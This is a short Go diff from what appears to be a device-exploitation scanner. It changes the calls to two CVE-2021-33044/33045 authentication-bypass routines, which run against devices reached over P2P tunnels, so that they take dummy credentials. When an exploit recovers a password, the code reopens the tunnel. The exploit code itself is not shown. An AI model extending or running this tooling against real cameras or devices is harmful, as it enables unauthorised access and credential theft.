@@ -414,7 +414,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	// CVE exploits
 	if s.Config.Pwn.Protocol["cgi"] {
 		if s.Config.Pwn.Methods["cve-2021-33044"] {
-			res, err := TryCVE2021_33044(tunnel)
+			res, err := TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
 			if err == nil && res != nil && res.Password != "" {
 				activeTunnel, fresh := reopenVerifiedTunnel(res)
 				if fresh {
@@ -433,7 +433,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		}
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
-			res, err := TryCVE2021_33045(tunnel)
+			res, err := TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
 			if err == nil && res != nil && res.Password != "" {
 				activeTunnel, fresh := reopenVerifiedTunnel(res)
 				if fresh {
